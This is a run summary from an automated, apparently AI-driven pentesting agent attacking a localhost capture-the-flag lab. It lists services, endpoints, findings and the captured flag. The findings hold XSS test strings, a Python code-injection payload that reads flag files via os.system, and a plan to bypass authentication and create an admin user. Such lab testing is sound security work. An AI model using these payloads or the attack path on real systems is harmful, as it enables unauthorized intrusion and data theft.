@@ -1,0 +1,57 @@
+DARWIN Run Summary — 20260704_161701
+Timestamp: 2026-07-04T16:25:39
+============================================================
+phase_at_end: done
+loop_count: 1
+solo_iterations: 1
+step_count: 12
+
+DKG Summary:
+Host: 1
+  - id=host-localhost: {'ip': 'localhost', 'is_reachable': True, 'is_internal': False, '_version': 3}
+Service: 3
+  - id=svc-localhost-10604: {'port': 10604, 'protocol': 'tcp', 'version': 'Werkzeug httpd (Python Flask dev server)', 'banner': 'http', 'service_name': 'http', '_version': 2, 'fingerprint': ['Werkzeug/3.1.8 Python/3.11.15', '127.0.0.1', '3.11.15', 'Cloud Function Invoker', '3.1.8']}
+  - id=svc-localhost-10702: {'port': 10702, 'protocol': 'tcp', 'version': 'Werkzeug httpd (Python Flask dev server)', 'banner': 'http', 'service_name': 'http', '_version': 2, 'fingerprint': ['OPTIONS, POST', 'Werkzeug/3.1.8 Python/3.11.15', '127.0.0.1', '3.11.15', '3.1.8']}
+  - id=svc-localhost-10705: {'port': 10705, 'protocol': 'tcp', 'version': 'Werkzeug httpd (Python Flask dev server)', 'banner': 'http', 'service_name': 'http', '_version': 2, 'fingerprint': ['Werkzeug/3.1.8 Python/3.11.15', '127.0.0.1', '3.11.15', '3.1.8']}
+Endpoint: 18
+  - id=ep-http://localhost:10604: {'url': 'http://localhost:10604', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': '<!DOCTYPE html>\n<html><head><title>Cloud Function Invoker</title></head>\n<body>\n<h1>Lambda Invocation API</h1>\n<p>Send a POST to <code>/invoke</code> with JSON body: <code>{"code": "your-python-code"}</code></p>\n<p>Status: <span style="color:green">Online</span></p>\n</body></html>', 'response_size': 456, '_version': 3, 'deep_recon_done': True, 'sample_content_type': 'text/html; charset=utf-8'}
+  - id=ep-path--: {'url': 'http://localhost:10705/', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--index.html: {'url': 'http://localhost:10705/index.html', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--home: {'url': 'http://localhost:10705/home', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--app: {'url': 'http://localhost:10705/app', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--login: {'url': 'http://localhost:10705/login', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--api: {'url': 'http://localhost:10705/api', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  - id=ep-path--metrics: {'url': 'http://localhost:10705/metrics', 'method': 'GET', 'params': '', 'sample_status': 200, 'sample_response': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:18:32 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n', 'response_size': 389, '_version': 3}
+  ... and 10 more
+Vulnerability: 7
+  - id=vuln-nikto-14: {'vuln_type': 'XSS', 'endpoint': 'http://localhost:10604', 'parameter': '', 'severity': 'low', 'source': 'nikto', 'detail': '- Nikto v2.1.5', '_version': 2, 'tested_at': '16:25:33', 'test_result': 'BLOCKED: <script>alert(1)</script>... (not found)\nBLOCKED: <img src=x onerror=alert(1)>... (not found)\nBLOCKED: "><script>alert(1)</script>... (not found)\nBLOCKED: \'><img src=x onerror=alert(1)>... (n', 'test_tool': 'xss_reflection_test'}
+  - id=vuln-nikto-20: {'vuln_type': 'XSS', 'endpoint': 'http://localhost:10604', 'parameter': '', 'severity': 'low', 'source': 'nikto', 'detail': "+ No CGI Directories found (use '-C all' to force check all possible dirs)", '_version': 9}
+  - id=vuln-1: {'vuln_type': 'CMDi', 'endpoint': 'http://localhost:10604/invoke', 'parameter': 'code', 'severity': 'unknown', 'source': 'llm_analysis', 'suggested_tool': 'send_payload', 'tool_args': {'url': 'http://localhost:10604/invoke', 'param': 'body', 'payload': '{"code": "import os; os.system(\'cat /flag*\')"}', 'method': 'POST', 'body_format': 'json', 'insecure': False}, '_version': 3, 'tested_at': '16:25:31', 'test_result': 'semicolon: error - HTTP Error 405: METHOD NOT ALLOWED\npipe: error - HTTP Error 405: METHOD NOT ALLOWED\nbacktick: error - HTTP Error 405: METHOD NOT ALLOWED\ndollar_subshell: error - HTTP Error 405: MET', 'test_tool': 'command_injection_test'}
+  - id=vuln-2: {'vuln_type': 'InformationDisclosure', 'endpoint': 'http://localhost:10702/health', 'parameter': '', 'severity': 'unknown', 'source': 'llm_analysis', 'suggested_tool': 'curl_get', 'tool_args': {'url': 'http://localhost:10702/health', 'insecure': False}, '_version': 2, 'tested_at': '16:25:31', 'test_result': 'HTTP/1.1 200 OK\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:25:31 GMT\r\nContent-Type: application/json\r\nContent-Length: 36\r\nConnection: close\r\n\r\n{"roles":7,"status":"ok","users":6', 'test_tool': 'curl_get'}
+  - id=vuln-3: {'vuln_type': 'AuthBypass', 'endpoint': 'http://localhost:10702', 'parameter': '', 'severity': 'unknown', 'source': 'llm_analysis', 'suggested_tool': 'http_post', 'tool_args': {'url': 'http://localhost:10702', 'data': '{}', 'insecure': False}, '_version': 3, 'tested_at': '16:25:31', 'test_result': 'HTTP/1.1 405 METHOD NOT ALLOWED\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:25:31 GMT\r\nContent-Type: text/html; charset=utf-8\r\nAllow: OPTIONS, POST\r\nContent-Length: 153\r\nConnecti', 'test_tool': 'curl_get'}
+  - id=vuln-4: {'vuln_type': 'PlatformDiscovery', 'endpoint': 'http://localhost:10705', 'parameter': '', 'severity': 'unknown', 'source': 'llm_analysis', 'suggested_tool': 'gobuster_dir', 'tool_args': {'url': 'http://localhost:10705', 'wordlist': ''}, '_version': 2, 'tested_at': '16:25:31', 'test_result': '2026/07/04 16:25:31 [!] 1 error occurred:\n\t* Wordlist (-w): File does not exist: -m\n\n', 'test_tool': 'gobuster_dir'}
+  - id=vuln-5: {'vuln_type': 'XSS', 'endpoint': 'http://localhost:10604', 'parameter': '', 'severity': 'low', 'source': 'llm_classified', 'detail': '- Nikto v2.1.5', '_version': 3, 'tested_at': '16:25:33', 'test_result': 'HTTP/1.1 404 NOT FOUND\r\nServer: Werkzeug/3.1.8 Python/3.11.15\r\nDate: Sat, 04 Jul 2026 08:25:33 GMT\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 207\r\nConnection: close\r\n\r\n<!doctype html>\n<h', 'test_tool': 'curl_get'}
+Analysis: 2
+  - id=analysis-1783153421: {'phase': 'analyze', 'content': "The target contains three services: (1) port 10604 is a 'Cloud Function Invoker' that explicitly accepts POST /invoke with a Python code JSON payload and executes it - a deliberate code execution interface; (2) port 10702 exposes a /health endpoint returning internal state (roles, users) and accepts only POST/OPTIONS on root, suggesting a management API; (3) port 10705 returns 404 for all probed GET paths but is a Werkzeug server, possibly hiding POST-only endpoints. The main RCE surface is port 10604.", 'endpoint_count': 17, '_version': 1}
+  - id=attack-path-path-21286: {'phase': 'analyze', 'content': 'Enumerate port 10702 via /health disclosure, then exploit unauthenticated API access to escalate privileges or extract flag.', 'path_id': 'path-21286', 'steps': [{'step': 1, 'vuln_type': 'InformationDisclosure', 'endpoint': 'http://localhost:10702/health', 'param': '', 'goal': 'Gather system state (user/role counts) to identify attack surface'}, {'step': 2, 'vuln_type': 'AuthBypass', 'endpoint': 'http://localhost:10702', 'param': '', 'goal': 'Attempt unauthenticated POST requests to create admin user or read sensitive data'}], 'step_count': 2, '_version': 2}
+
+Result:
+  success: True
+  flag: flag{cloud-04-step2-lambda}
+  steps: 12
+  tokens_used: 19997
+  time_elapsed: 517.4s
+  error: 
+  defense_detected: False
+  waf_bypassed: False
+  waf_type: 
+
+Phase Logs:
+  log/research/20260704_161701_analyze.log (420 bytes)
+  log/scan/20260704_161701_bootstrap.log (401 bytes)
+  log/recon/20260704_161701_deep_recon.log (687 bytes)
+  log/recon/20260704_161701_defense_detection.log (250 bytes)
+  log/plan/20260704_161701_plan.log (1289 bytes)
+  log/research/20260704_161701_research_phase.log (199 bytes)
+  log/research/20260704_161701_service_research.log (161 bytes)
+  log/exploit/20260704_161701_systematic_exploit.log (229 bytes)
